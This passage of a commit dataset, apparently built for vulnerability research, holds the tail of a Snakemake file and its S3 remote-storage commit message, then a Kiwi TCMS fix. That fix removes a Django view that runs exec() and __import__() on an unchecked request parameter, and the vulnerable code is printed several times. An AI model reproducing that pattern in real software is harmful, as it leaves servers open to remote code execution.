self.globals[ruleinfo.func.__name__] = ruleinfo.func\n            setattr(rules, name, rule)\n            return ruleinfo.func\n\n        return decorate\n\n    def docstring(self, string):\n        def decorate(ruleinfo):\n            ruleinfo.docstring = string\n            return ruleinfo\n\n        return decorate\n\n    def input(self, *paths, **kwpaths):\n        def decorate(ruleinfo):\n            ruleinfo.input = (paths, kwpaths)\n            return ruleinfo\n\n        return decorate\n\n    def output(self, *paths, **kwpaths):\n        def decorate(ruleinfo):\n            ruleinfo.output = (paths, kwpaths)\n            return ruleinfo\n\n        return decorate\n\n    def params(self, *params, **kwparams):\n        def decorate(ruleinfo):\n            ruleinfo.params = (params, kwparams)\n            return ruleinfo\n\n        return decorate\n\n    def message(self, message):\n        def decorate(ruleinfo):\n            ruleinfo.message = message\n            return ruleinfo\n\n        return decorate\n\n    def benchmark(self, benchmark):\n        def decorate(ruleinfo):\n            ruleinfo.benchmark = benchmark\n            return ruleinfo\n\n        return decorate\n\n    def threads(self, threads):\n        def decorate(ruleinfo):\n            ruleinfo.threads = threads\n            return ruleinfo\n\n        return decorate\n\n    def resources(self, *args, **resources):\n        def decorate(ruleinfo):\n            ruleinfo.resources = (args, resources)\n            return ruleinfo\n\n        return decorate\n\n    def priority(self, priority):\n        def decorate(ruleinfo):\n            ruleinfo.priority = priority\n            return ruleinfo\n\n        return decorate\n\n    def version(self, version):\n        def decorate(ruleinfo):\n            ruleinfo.version = version\n            return ruleinfo\n\n        return decorate\n\n    def log(self, *logs, **kwlogs):\n        def decorate(ruleinfo):\n            ruleinfo.log = (logs, kwlogs)\n            return ruleinfo\n\n        return decorate\n\n    def shellcmd(self, cmd):\n        def decorate(ruleinfo):\n            ruleinfo.shellcmd = cmd\n            return ruleinfo\n\n        return decorate\n\n    def norun(self):\n        def decorate(ruleinfo):\n            ruleinfo.norun = True\n            return ruleinfo\n\n        return decorate\n\n    def run(self, func):\n        return RuleInfo(func)\n\n    @staticmethod\n    def _empty_decorator(f):\n        return f\n\n\nclass RuleInfo:\n    def __init__(self, func):\n        self.func = func\n        self.shellcmd = None\n        self.norun = False\n        self.input = None\n        self.output = None\n        self.params = None\n        self.message = None\n        self.benchmark = None\n        self.threads = None\n        self.resources = None\n        self.priority = None\n        self.version = None\n        self.log = None\n        self.docstring = None\n\n\nclass Subworkflow:\n    def __init__(self, workflow, name, snakefile, workdir):\n        self.workflow = workflow\n        self.name = name\n        self._snakefile = snakefile\n        self._workdir = workdir\n\n    @property\n    def snakefile(self):\n        if self._snakefile is None:\n            return os.path.abspath(os.path.join(self.workdir, \"Snakefile\"))\n        if not os.path.isabs(self._snakefile):\n            return os.path.abspath(os.path.join(self.workflow.basedir,\n                                                self._snakefile))\n        return self._snakefile\n\n    @property\n    def workdir(self):\n        workdir = \".\" if self._workdir is None else self._workdir\n        if not os.path.isabs(workdir):\n            return os.path.abspath(os.path.join(self.workflow.basedir,\n                                                workdir))\n        return workdir\n\n    def target(self, paths):\n        if not_iterable(paths):\n            return flag(os.path.join(self.workdir, paths), \"subworkflow\", self)\n        return [self.target(path) for path in paths]\n\n    def targets(self, dag):\n        return [f for job in dag.jobs for f in job.subworkflow_input\n                if job.subworkflow_input[f] is self]\n\n\nclass Rules:\n    \"\"\" A namespace for rules so that they can be accessed via dot notation. \"\"\"\n    pass\n\n\ndef srcdir(path):\n    \"\"\"Return the absolute path, relative to the source directory of the current Snakefile.\"\"\"\n    if not workflow.included_stack:\n        return None\n    return os.path.join(os.path.dirname(workflow.included_stack[-1]), path)\n"}}, "msg": "Initial commit with support for remote files.\n\nThis introduces changes that scratch an itch within our research group for remote file support, and I hope the new functionality will be useful for others as well.\n\nWhat is it all about? Wouldn't it be wonderful if you would use Snakemake with remote data stored on Amazon S3? Imagine being able to read and write the same files as your collaborators without rsyncing files back and forth or using pricey network-attached storage. Want to output and store 1PB of small files? Want to let someone else worry about durability? Want to work with large files locally that you can store individually but that are too large in aggregate? The support for remote storage introduced with these changes will allow you do all of these things! Remote storage is initially intended to work with AWS S3 and things sporting a similar API, though it is flexible enough that would could extended it to support other remote providers. It expect you to already have an S3 bucket setup, and API credentials for it permitting read/write access.\n\nHere's how you use it:\n\nThe `Snakefile` now supports a wrapper function, `remote()`, indicating a file is on a remote storage provider (this is similar to `temp()` or `protected()`). During rule execution, the file (or object) specified, is downloaded to the `cwd`, within a sub-directory bearing the same name as the bucket. This lets you have multiple remote origins with reduced likelihood of name collisions, and allows snakemake to easily translate remote objects to local file paths. The `remote()` wrapper is mutually-exclusive with the `temp()` and `protected()` wrappers.\n\nThe implementation of all communication with the remote storage provider is specified in a class passed as a keyword argument to the remote wrapper. This class defines methods related to being a RemoteObject(). By default, the S3 provider is used and it does not need to be specified explicitly. If you are interested in creating a custom remote storage provider for whatever system you are using, implement the methods defined in the abstract base class `snakemake.remote_providers.RemoteObjectProvider`. Take a look at the S3 provider for an example implementation. To use a custom remote storage provider implementation (FTP, etc.), import it within your `Snakefile`, and set the `provider` keyword argument, as is being done with S3 below:\n\n    import snakemake.remote_providers.S3 as S3\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3)\n\nSince S3 is the default remote storage provider, it can be omitted from the `Snakefile`:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\")\n\nAdditional kwargs can be passed to the remote provider this way to set credentials, should you not want to rely on whichever credentials happen to be stored in the environment variables (suggestion: if using multiple buckets with different credentials, read in the key and secret within your `Snakefile` and pass as appropriate to the `remote()` wrappers). For the S3 provider, the additional kwargs are passed straight through to the boto `connect_s3()` method, so refer to the [boto docs](https://boto.readthedocs.org/en/latest/ref/s3.html#boto.s3.connection.S3Connection) to see the available parameters:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3, additional_kwargs={\"aws_access_key_id\":\"myKey\", \"aws_secret_access_key\":\"mySecret\"})\n\nThis can also be used to specify a custom URL to connect to rather than AWS, for a different service offering an S3-like API:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3, additional_kwargs={\"host\":\"mystorageapi.example.com\"})\n\nFor any storage backend with an API deviating significantly from that of S3, it may make sense to create a new remote provider.\n\nExpand still works as expected, just wrap the expansion:\n\n    rule all:\n        input:\n            remote(expand(\"bucket-name/{letter}-2.txt\", letter=[\"A\", \"B\", \"C\"]), provider=S3)\n\nOnly remote files needed to satisfy the DAG build are downloaded for the workflow.  By default, remote files downloaded prior to rule execution and are removed locally as soon as no rules depend on them. Remote files can be explicitly kept by setting the `keep=True` keyword argument:\n\n    rule all:\n        input: remote('bucket-name/prefix{split_id}.txt', keep=True)\n\nIf you wish to have a rule to simply download a file to a local copy, you can do so by declaring the same file path locally as is used by the remote file:\n\n    rule all:\n        input:\n            remote(\"bucket-name/out.txt\")\n        output:\n            \"bucket-name/out.txt\"\n        run:\n            shell(\"cp {output[0]} ./\")\n\nHere's a brief summary of the changes. I tried to minimize the impact on existing code, relying where possible on external classes, new functions, and the use of decorators to connect them.\n\nWithin `io.py`, the usage of flags has been extended to store not just boolean values, but also objects. This is how, for example, the remote provider is passed to the `_IOFile()` object.\n\nSeveral methods of `_IOFile()` now bear a decorator \"@_referToRemote\". When called, this decorator ensures that for files flagged as `remote()`, the methods defined in the class for the remote provider are used rather than the local equivalents specified within the `_IOFile()` class of `io.py`.\n\nThe `dag.py` file has been updated to have a `handle_remote()` method that is responsible for handling remote files after job execution. It uploads files that are not remote, and removes local files flagged as remote when they are no longer needed (exception: if the `\"keep=True\"` argument is provided to `remote()`).\n\nA `decorators.py` file has been added for general-purpose decorators. Currently in use is `@decAllMethods`, which is a class decorator that applies a specified decorator to all methods of a decorated class. This is used with in the `test_remote/` unit test to help mock out methods of `RemoteObject()`.\n\nTwo new exceptions have been added, `RemoteFileException()` and `S3FileException()`. These could probably be used more.\n\nThe `jobs.py` file has been changed to add methods related to assessing remote files for a given job. It also has two new functions used in `dag.py` `handle_remote()` to delete remote-containing directories when they are empty after purging local copies of remote files. It also adds `expanded_input()`, which is used in `handle_remote()` to help determine which wildcard/dynamic files should be removed after job execution. The function `expanded_input()` would benefit from a critical eye.\n\nThe `rules.py` file has a small change causing newly expanded `_IOFile`s to clone the flags of their unexpanded sources. There's probably a better way.\n\nThe `workflow.py` file has been modified to import the new `glob_wildcards_remote()` helper function from `io.py`. This function is the remote analog to `glob_wildcards()`, but it needs to know the remote provider (S3 is default).\n\nA unit test has been added, `test_remote/`. This is similar in nature to the function `test_cluster_dynamic/`. For testing, the `moto` package is used to mock out boto, so that remote file tests do not need to hit the live S3 API.\n\nThese changes have the following dependencies (as represented in setup.py):\n* boto>=2.38.0 (for making AWS/S3 API calls)\n* filechunkio>=1.6 (for file chunking prior to multipart upload, avoiding wheel reinvention)\n* moto>=0.4.14 (for mocking up local S3 \"buckets\" for unit testing)\n\nThis is a first pass at support for remote storage support, and feedback is welcome. The intent was to add remote file support while make minimal changes to existing Snakemake logic."}}, "https://github.com/sordhlm/Kiwi_optimization": {"bb986000ed3cb222832e1e4535dd6316d32503f8": {"url": "https://api.github.com/repos/sordhlm/Kiwi_optimization/commits/bb986000ed3cb222832e1e4535dd6316d32503f8", "html_url": "https://github.com/sordhlm/Kiwi_optimization/commit/bb986000ed3cb222832e1e4535dd6316d32503f8", "message": "[bandit] Remove veiw that calls exec & import with untrusted data\n\nIssue: [B102:exec_used] Use of exec detected.\n\nFix: Completely remove the view which does this. That was meant as\n     a function which will dynamically return HTML forms for\n     rendering on the front-end by receiving form module.ClassName\n     from the sender!\n\n     The offending code was blindly trusting untrusted input and:\n\n     exec('import tcms.%s as form' % request.GET.get('app_form'))\n     __import__('tcms.%s' % request.GET.get('app_form'))\n\n     This is actually a big deal because it allows remote code\n     execution by sending a very simple POST request!\n\nBecause the offending view is actually always called with a single\nvalue I replace it with a view that returns that particular form\nas HTML and also update the JavaScript code.", "sha": "bb986000ed3cb222832e1e4535dd6316d32503f8", "keyword": "remote code execution issue", "diff": "diff --git a/tcms/core/ajax.py b/tcms/core/ajax.py\nindex e9150751..8f7515a3 100644\n--- a/tcms/core/ajax.py\n+++ b/tcms/core/ajax.py\n@@ -5,7 +5,6 @@\n Most of these functions are use for Ajax.\n \"\"\"\n import datetime\n-import sys\n import json\n from distutils.util import strtobool\n \n@@ -118,34 +117,6 @@ def versions(self):\n         return Version.objects.filter(product__id=self.product_id)\n \n \n-@require_GET\n-def form(request):\n-    \"\"\"Response get form ajax call, most using in dialog\"\"\"\n-\n-    # The parameters in internal_parameters will delete from parameters\n-    internal_parameters = ['app_form', 'format']\n-    parameters = strip_parameters(request.GET, internal_parameters)\n-    q_app_form = request.GET.get('app_form')\n-    q_format = request.GET.get('format')\n-    if not q_format:\n-        q_format = 'p'\n-\n-    if not q_app_form:\n-        return HttpResponse('Unrecognizable app_form')\n-\n-    # Get the form\n-    q_app, q_form = q_app_form.split('.')[0], q_app_form.split('.')[1]\n-    exec('from tcms.%s.forms import %s as form' % (q_app, q_form))\n-    __import__('tcms.%s.forms' % q_app)\n-    q_app_module = sys.modules['tcms.%s.forms' % q_app]\n-    form_class = getattr(q_app_module, q_form)\n-    form_params = form_class(initial=parameters)\n-\n-    # Generate the HTML and reponse\n-    html = getattr(form_params, 'as_' + q_format)\n-    return HttpResponse(html())\n-\n-\n def tags(request):\n     \"\"\" Get tags for TestPlan, TestCase or TestRun \"\"\"\n \ndiff --git a/tcms/core/tests/test_views.py b/tcms/core/tests/test_views.py\nindex 8340dd4d..61d5dcd4 100644\n--- a/tcms/core/tests/test_views.py\n+++ b/tcms/core/tests/test_views.py\n@@ -14,7 +14,6 @@\n from tcms.management.models import Priority\n from tcms.management.models import EnvGroup\n from tcms.management.models import EnvProperty\n-from tcms.testcases.forms import CaseAutomatedForm\n from tcms.testcases.forms import TestCase\n from tcms.testplans.models import TestPlan\n from tcms.testruns.models import TestCaseRun\n@@ -249,16 +248,6 @@ def test_change_case_run_status(self):\n             'PAUSED', TestCaseRun.objects.get(pk=self.case_run_1.pk).case_run_status.name)\n \n \n-class TestGetForm(test.TestCase):\n-    \"\"\"Test case for form\"\"\"\n-\n-    def test_get_form(self):\n-        response = self.client.get(reverse('ajax-form'),\n-                                   {'app_form': 'testcases.CaseAutomatedForm'})\n-        form = CaseAutomatedForm()\n-        self.assertHTMLEqual(str(response.content, encoding=settings.DEFAULT_CHARSET), form.as_p())\n-\n-\n class TestUpdateCasePriority(BasePlanCase):\n     \"\"\"Test case for update_cases_default_tester\"\"\"\n \ndiff --git a/tcms/static/js/tcms_actions.js b/tcms/static/js/tcms_actions.js\nindex cf8a4d28..25d43cca 100644\n--- a/tcms/static/js/tcms_actions.js\n+++ b/tcms/static/js/tcms_actions.js\n@@ -160,7 +160,6 @@ var default_messages = {\n       change_user_group: '/management/account/$id/changegroup/',\n       change_user_status: '/management/account/$id/changestatus/',\n \n-      get_form: '/ajax/form/',\n       get_product_info: '/management/getinfo/',\n \n       modify_plan : '/plan/$id/modify/',\n@@ -930,33 +929,6 @@ function getInfo(parameters, callback, container, allow_blank, format) {\n   });\n }\n \n-function getForm(container, app_form, parameters, callback, format) {\n-  var failure = function(t) {\n-    window.alert('Getting form get errors');\n-    return false;\n-  };\n-\n-  if (!parameters) {\n-    var parameters = {};\n-  }\n-\n-  parameters.app_form = app_form;\n-  parameters.format = format;\n-\n-  var url = Nitrate.http.URLConf.reverse({ name: 'get_form'});\n-  jQ.ajax({\n-    'url': url,\n-    'type': 'GET',\n-    'data': parameters,\n-    'success': function (data, textStatus, jqXHR) {\n-      jQ(container).html(data);\n-      callback(jqXHR);\n-    },\n-    'error': function (jqXHR, textStatus, errorThrown) {\n-      failure();\n-    }\n-  });\n-}\n \n function updateRunStatus(content_type, object_pk, field, value, value_type, callback) {\n   if (!value_type) {\ndiff --git a/tcms/static/js/testcase_actions.js b/tcms/static/js/testcase_actions.js\nindex 83d2fafa..abc8d7b4 100644\n--- a/tcms/static/js/testcase_actions.js\n+++ b/tcms/static/js/testcase_actions.js\n@@ -1026,8 +1026,9 @@ function updateCaseCategory(url, parameters, callback) {\n function constructCaseAutomatedForm(container, callback, options) {\n   jQ(container).html(getAjaxLoading());\n   jQ(container).show();\n+\n   var d = jQ('<div>', { 'class': 'automated_form' })[0];\n-  var c = function(t) {\n+  var create_form_cb = function(t) {\n     var returntext = t.responseText;\n     var action = '/cases/automated/';\n     var form_observe = function(e) {\n@@ -1046,7 +1047,7 @@ function constructCaseAutomatedForm(container, callback, options) {\n       });\n       /*\n        * Have to add this. The form generated before does not contain a\n-       * default value `change'. In fact, the field a onust contain the\n+       * default value `change'. In fact, the field a must contain the\n        * only value `change', here.\n        */\n       params = params.replace(/a=\\w*/, 'a=change');\n@@ -1064,7 +1065,22 @@ function constructCaseAutomatedForm(container, callback, options) {\n     jQ(container).html(f);\n   };\n \n-  getForm(d, 'testcases.CaseAutomatedForm', {}, c);\n+\n+  // load the HTML form\n+  jQ.ajax({\n+    'url': '/cases/form/automated/',\n+    'type': 'GET',\n+    'success': function (data, textStatus, jqXHR) {\n+      jQ(container).html(data);\n+    },\n+    'error': function (jqXHR, textStatus, errorThrown) {\n+      window.alert('Getting form get errors');\n+      return false;\n+    },\n+    'complete': function(jqXHR) {\n+      create_form_cb(jqXHR);\n+    }\n+  });\n }\n \n /*\ndiff --git a/tcms/testcases/tests/test_form_views.py b/tcms/testcases/tests/test_form_views.py\nnew file mode 100644\nindex 00000000..235a3e5e\n--- /dev/null\n+++ b/tcms/testcases/tests/test_form_views.py\n@@ -0,0 +1,15 @@\n+# -*- coding: utf-8 -*-\n+\n+from django import test\n+from django.urls import reverse\n+from django.conf import settings\n+\n+from tcms.testcases.forms import CaseAutomatedForm\n+\n+\n+class TestForm_AutomatedView(test.TestCase):\n+    def test_get_form(self):\n+        \"\"\"Verify the view renders the expected HTML\"\"\"\n+        response = self.client.get(reverse('testcases-form-automated'))\n+        form = CaseAutomatedForm()\n+        self.assertHTMLEqual(str(response.content, encoding=settings.DEFAULT_CHARSET), form.as_p())\ndiff --git a/tcms/testcases/urls/cases_urls.py b/tcms/testcases/urls/cases_urls.py\nindex 990011f4..e8133f8d 100644\n--- a/tcms/testcases/urls/cases_urls.py\n+++ b/tcms/testcases/urls/cases_urls.py\n@@ -10,6 +10,7 @@\n     url(r'^search/$', views.search, name='testcases-search'),\n     url(r'^load-more/$', views.load_more_cases),\n     url(r'^ajax/$', views.ajax_search, name='testcases-ajax_search'),\n+    url(r'^form/automated/$', views.form_automated, name='testcases-form-automated'),\n     url(r'^automated/$', views.automated, name='testcases-automated'),\n     url(r'^component/$', views.component, name='testcases-component'),\n     url(r'^category/$', views.category, name='testcases-category'),\ndiff --git a/tcms/testcases/views.py b/tcms/testcases/views.py\nindex c74ffc04..e73ab268 100644\n--- a/tcms/testcases/views.py\n+++ b/tcms/testcases/views.py\n@@ -134,6 +134,16 @@ def create_testcase(request, form, tp):\n     return tc\n \n \n+@require_GET\n+def form_automated(request):\n+    \"\"\"\n+        Return HTML for the form which allows changing of automated status.\n+        Form submission is handled by automated() below.\n+    \"\"\"\n+    form = CaseAutomatedForm()\n+    return HttpResponse(form.as_p())\n+\n+\n @require_POST\n @permission_required('testcases.change_testcase')\n def automated(request):\ndiff --git a/tcms/urls.py b/tcms/urls.py\nindex 0731b3b4..7c664376 100644\n--- a/tcms/urls.py\n+++ b/tcms/urls.py\n@@ -51,7 +51,6 @@\n         name='ajax-update_cases_default_tester'),\n     url(r'^ajax/update/cases-reviewer/$', ajax.update_cases_reviewer),\n     url(r'^ajax/update/cases-sortkey/$', ajax.update_cases_sortkey),\n-    url(r'^ajax/form/$', ajax.form, name='ajax-form'),\n     url(r'^ajax/get-prod-relate-obj/$', ajax.get_prod_related_obj_json),\n     url(r'^management/getinfo/$', ajax.info, name='ajax-info'),\n     url(r'^management/tags/$', ajax.tags, name='ajax-tags'),\n", "files": {"/tcms/core/ajax.py": {"changes": [{"diff": "\n Most of these functions are use for Ajax.\n \"\"\"\n import datetime\n-import sys\n import json\n from distutils.util import strtobool\n \n", "add": 0, "remove": 1, "filename": "/tcms/core/ajax.py", "badparts": ["import sys"], "goodparts": []}, {"diff": "\n         return Version.objects.filter(product__id=self.product_id)\n \n \n-@require_GET\n-def form(request):\n-    \"\"\"Response get form ajax call, most using in dialog\"\"\"\n-\n-    # The parameters in internal_parameters will delete from parameters\n-    internal_parameters = ['app_form', 'format']\n-    parameters = strip_parameters(request.GET, internal_parameters)\n-    q_app_form = request.GET.get('app_form')\n-    q_format = request.GET.get('format')\n-    if not q_format:\n-        q_format = 'p'\n-\n-    if not q_app_form:\n-        return HttpResponse('Unrecognizable app_form')\n-\n-    # Get the form\n-    q_app, q_form = q_app_form.split('.')[0], q_app_form.split('.')[1]\n-    exec('from tcms.%s.forms import %s as form' % (q_app, q_form))\n-    __import__('tcms.%s.forms' % q_app)\n-    q_app_module = sys.modules['tcms.%s.forms' % q_app]\n-    form_class = getattr(q_app_module, q_form)\n-    form_params = form_class(initial=parameters)\n-\n-    # Generate the HTML and reponse\n-    html = getattr(form_params, 'as_' + q_format)\n-    return HttpResponse(html())\n-\n-\n def tags(request):\n     \"\"\" Get tags for TestPlan, TestCase or TestRun \"\"\"\n ", "add": 0, "remove": 28, "filename": "/tcms/core/ajax.py", "badparts": ["@require_GET", "def form(request):", "    \"\"\"Response get form ajax call, most using in dialog\"\"\"", "    internal_parameters = ['app_form', 'format']", "    parameters = strip_parameters(request.GET, internal_parameters)", "    q_app_form = request.GET.get('app_form')", "    q_format = request.GET.get('format')", "    if not q_format:", "        q_format = 'p'", "    if not q_app_form:", "        return HttpResponse('Unrecognizable app_form')", "    q_app, q_form = q_app_form.split('.')[0], q_app_form.split('.')[1]", "    exec('from tcms.%s.forms import %s as form' % (q_app, q_form))", "    __import__('tcms.%s.forms' % q_app)", "    q_app_module = sys.modules['tcms.%s.forms' % q_app]", "    form_class = getattr(q_app_module, q_form)", "    form_params = form_class(initial=parameters)", "    html = getattr(form_params, 'as_' + q_format)", "    return HttpResponse(html())"], "goodparts": []}], "source": "\n \"\"\" Shared functions for plan/case/run. Most of these functions are use for Ajax. \"\"\" import datetime import sys import json from distutils.util import strtobool from django import http from django.db.models import Q, Count from django.contrib.auth.models import User from django.core import serializers from django.core.exceptions import ObjectDoesNotExist from django.apps import apps from django.forms import ValidationError from django.http import Http404 from django.http import HttpResponse from django.shortcuts import render from django.views.decorators.http import require_GET from django.views.decorators.http import require_POST from tcms.signals import POST_UPDATE_SIGNAL from tcms.management.models import Component, Build, Version from tcms.management.models import Priority from tcms.management.models import Tag from tcms.management.models import EnvGroup, EnvProperty, EnvValue from tcms.testcases.models import TestCase, Bug from tcms.testcases.models import Category from tcms.testcases.models import TestCaseStatus, TestCaseTag from tcms.testcases.views import plan_from_request_or_none from tcms.testplans.models import TestPlan, TestCasePlan, TestPlanTag from tcms.testruns.models import TestRun, TestCaseRun, TestCaseRunStatus, TestRunTag from tcms.core.helpers.comments import add_comment from tcms.core.utils.validations import validate_bug_id def check_permission(request, ctype): perm='%s.change_%s' % tuple(ctype.split('.')) if request.user.has_perm(perm): return True return False def strip_parameters(request_dict, skip_parameters): parameters={} for key, value in request_dict.items(): if key not in skip_parameters and value: parameters[str(key)]=value return parameters @require_GET def info(request): \"\"\"Ajax responder for misc information\"\"\" objects=_InfoObjects(request=request, product_id=request.GET.get('product_id')) info_type=getattr(objects, request.GET.get('info_type')) if not info_type: return HttpResponse('Unrecognizable info-type') if request.GET.get('format')=='ulli': field=request.GET.get('field', default='name') response_str='<ul>' for obj_value in info_type().values(field): response_str +='<li>' +obj_value.get(field, None) +'</li>' response_str +='</ul>' return HttpResponse(response_str) return HttpResponse(serializers.serialize('json', info_type(), fields=('name', 'value'))) class _InfoObjects(object): def __init__(self, request, product_id=None): self.request=request try: self.product_id=int(product_id) except(ValueError, TypeError): self.product_id=0 def builds(self): try: is_active=strtobool(self.request.GET.get('is_active', default='False')) except(ValueError, TypeError): is_active=False return Build.objects.filter(product_id=self.product_id, is_active=is_active) def categories(self): return Category.objects.filter(product__id=self.product_id) def components(self): return Component.objects.filter(product__id=self.product_id) def env_groups(self): return EnvGroup.objects.all() def env_properties(self): if self.request.GET.get('env_group_id'): return EnvGroup.objects.get(id=self.request.GET['env_group_id']).property.all() return EnvProperty.objects.all() def env_values(self): return EnvValue.objects.filter(property__id=self.request.GET.get('env_property_id')) def users(self): query=strip_parameters(self.request.GET, skip_parameters=('info_type', 'field', 'format')) return User.objects.filter(**query) def versions(self): return Version.objects.filter(product__id=self.product_id) @require_GET def form(request): \"\"\"Response get form ajax call, most using in dialog\"\"\" internal_parameters=['app_form', 'format'] parameters=strip_parameters(request.GET, internal_parameters) q_app_form=request.GET.get('app_form') q_format=request.GET.get('format') if not q_format: q_format='p' if not q_app_form: return HttpResponse('Unrecognizable app_form') q_app, q_form=q_app_form.split('.')[0], q_app_form.split('.')[1] exec('from tcms.%s.forms import %s as form' %(q_app, q_form)) __import__('tcms.%s.forms' % q_app) q_app_module=sys.modules['tcms.%s.forms' % q_app] form_class=getattr(q_app_module, q_form) form_params=form_class(initial=parameters) html=getattr(form_params, 'as_' +q_format) return HttpResponse(html()) def tags(request): \"\"\" Get tags for TestPlan, TestCase or TestRun \"\"\" tag_objects=_TagObjects(request) template_name, obj=tag_objects.get() q_tag=request.GET.get('tags') q_action=request.GET.get('a') if q_action: tag_actions=_TagActions(obj=obj, tag_name=q_tag) getattr(tag_actions, q_action)() all_tags=obj.tag.all().order_by('pk') test_plan_tags=TestPlanTag.objects.filter( tag__in=all_tags).values('tag').annotate(num_plans=Count('tag')).order_by('tag') test_case_tags=TestCaseTag.objects.filter( tag__in=all_tags).values('tag').annotate(num_cases=Count('tag')).order_by('tag') test_run_tags=TestRunTag.objects.filter( tag__in=all_tags).values('tag').annotate(num_runs=Count('tag')).order_by('tag') plan_counter=_TagCounter('num_plans', test_plan_tags) case_counter=_TagCounter('num_cases', test_case_tags) run_counter=_TagCounter('num_runs', test_run_tags) for tag in all_tags: tag.num_plans=plan_counter.calculate_tag_count(tag) tag.num_cases=case_counter.calculate_tag_count(tag) tag.num_runs=run_counter.calculate_tag_count(tag) context_data={ 'tags': all_tags, 'object': obj, } return render(request, template_name, context_data) class _TagObjects(object): \"\"\" Used for getting the chosen object(TestPlan, TestCase or TestRun) from the database \"\"\" def __init__(self, request): \"\"\" :param request: An HTTP GET request, containing the primary key and the type of object to be selected :type request: HttpRequest \"\"\" for obj in['plan', 'case', 'run']: if request.GET.get(obj): self.object=obj self.object_pk=request.GET.get(obj) break def get(self): func=getattr(self, self.object) return func() def plan(self): return 'management/get_tag.html', TestPlan.objects.get(pk=self.object_pk) def case(self): return 'management/get_tag.html', TestCase.objects.get(pk=self.object_pk) def run(self): return 'run/get_tag.html', TestRun.objects.get(pk=self.object_pk) class _TagActions(object): \"\"\" Used for performing the 'add' and 'remove' actions on a given tag \"\"\" def __init__(self, obj, tag_name): \"\"\" :param obj: the object for which the tag actions would be performed :type obj: either a:class:`tcms.testplans.models.TestPlan`, a:class:`tcms.testcases.models.TestCase` or a:class:`tcms.testruns.models.TestRun` :param tag_name: The name of the tag to be manipulated :type tag_name: str \"\"\" self.obj=obj self.tag_name=tag_name def add(self): tag, _=Tag.objects.get_or_create(name=self.tag_name) self.obj.add_tag(tag) def remove(self): tag=Tag.objects.get(name=self.tag_name) self.obj.remove_tag(tag) class _TagCounter(object): \"\"\" Used for counting the number of times a tag is assigned to TestRun/TestCase/TestPlan \"\"\" def __init__(self, key, test_tags): \"\"\" :param key: either 'num_plans', 'num_cases', 'num_runs', depending on what you want count :type key: str :param test_tags: query set, containing the Tag->Object relationship, ordered by tag and annotated by key e.g. TestPlanTag, TestCaseTag ot TestRunTag :type test_tags: QuerySet \"\"\" self.key=key self.test_tags=iter(test_tags) self.counter={'tag': 0} def calculate_tag_count(self, tag): \"\"\" :param tag: the tag you do the counting for :type tag::class:`tcms.management.models.Tag` :return: the number of times a tag is assigned to object :rtype: int \"\"\" if self.counter['tag'] !=tag.pk: try: self.counter=self.test_tags.__next__() except StopIteration: return 0 if tag.pk==self.counter['tag']: return self.counter[self.key] return 0 def get_value_by_type(val, v_type): \"\"\" Exampls: 1. get_value_by_type('True', 'bool') (1, None) 2. get_value_by_type('19860624 123059', 'datetime') (datetime.datetime(1986, 6, 24, 12, 30, 59), None) 3. get_value_by_type('5', 'int') ('5', None) 4. get_value_by_type('string', 'str') ('string', None) 5. get_value_by_type('everything', 'None') (None, None) 6. get_value_by_type('buggy', 'buggy') (None, 'Unsupported value type.') 7. get_value_by_type('string', 'int') (None, \"invalid literal for int() with base 10: 'string'\") \"\"\" value=error=None def get_time(time): date_time=datetime.datetime if time=='NOW': return date_time.now() return date_time.strptime(time, '%Y%m%d %H%M%S') pipes={ 'bool': lambda x: x=='True' and 1 or 0, 'datetime': get_time, 'int': lambda x: str(int(x)), 'str': lambda x: str(x), 'None': lambda x: None, } pipe=pipes.get(v_type, None) if pipe is None: error='Unsupported value type.' else: try: value=pipe(val) except Exception as e: error=str(e) return value, error def say_no(error_msg): ajax_response={'rc': 1, 'response': error_msg} return HttpResponse(json.dumps(ajax_response)) def say_yes(): return HttpResponse(json.dumps({'rc': 0, 'response': 'ok'})) @require_POST def update(request): \"\"\" Generic approach to update a model,\\n based on contenttype. \"\"\" now=datetime.datetime.now() data=request.POST.copy() ctype=data.get(\"content_type\") vtype=data.get('value_type', 'str') object_pk_str=data.get(\"object_pk\") field=data.get('field') value=data.get('value') object_pk=[int(a) for a in object_pk_str.split(',')] if not field or not value or not object_pk or not ctype: return say_no( 'Following fields are required -content_type, ' 'object_pk, field and value.') field=str(field) value, error=get_value_by_type(value, vtype) if error: return say_no(error) has_perms=check_permission(request, ctype) if not has_perms: return say_no('Permission Dinied.') model=apps.get_model(*ctype.split(\".\", 1)) targets=model._default_manager.filter(pk__in=object_pk) if not targets: return say_no('No record found') if not hasattr(targets[0], field): return say_no('%s has no field %s' %(ctype, field)) if hasattr(targets[0], 'log_action'): for t in targets: try: t.log_action( who=request.user, action='Field %s changed from %s to %s.' %( field, getattr(t, field), value ) ) except(AttributeError, User.DoesNotExist): pass objects_update(targets, **{field: value}) if hasattr(model, 'mail_scene'): mail_context=model.mail_scene( objects=targets, field=field, value=value, ctype=ctype, object_pk=object_pk, ) if mail_context: from tcms.core.utils.mailto import mailto mail_context['context']['user']=request.user try: mailto(**mail_context) except Exception: pass if ctype=='testruns.testcaserun' and field=='case_run_status': for t in targets: field='close_date' t.log_action( who=request.user, action='Field %s changed from %s to %s.' %( field, getattr(t, field), now ) ) if t.tested_by !=request.user: field='tested_by' t.log_action( who=request.user, action='Field %s changed from %s to %s.' %( field, getattr(t, field), request.user ) ) field='assignee' try: assignee=t.assginee if assignee !=request.user: t.log_action( who=request.user, action='Field %s changed from %s to %s.' %( field, getattr(t, field), request.user ) ) t.save() except(AttributeError, User.DoesNotExist): pass targets.update(close_date=now, tested_by=request.user) return say_yes() @require_POST def update_case_run_status(request): \"\"\" Update Case Run status. \"\"\" now=datetime.datetime.now() data=request.POST.copy() ctype=data.get(\"content_type\") vtype=data.get('value_type', 'str') object_pk_str=data.get(\"object_pk\") field=data.get('field') value=data.get('value') object_pk=[int(a) for a in object_pk_str.split(',')] if not field or not value or not object_pk or not ctype: return say_no( 'Following fields are required -content_type, ' 'object_pk, field and value.') field=str(field) value, error=get_value_by_type(value, vtype) if error: return say_no(error) has_perms=check_permission(request, ctype) if not has_perms: return say_no('Permission Dinied.') model=apps.get_model(*ctype.split(\".\", 1)) targets=model._default_manager.filter(pk__in=object_pk) if not targets: return say_no('No record found') if not hasattr(targets[0], field): return say_no('%s has no field %s' %(ctype, field)) if hasattr(targets[0], 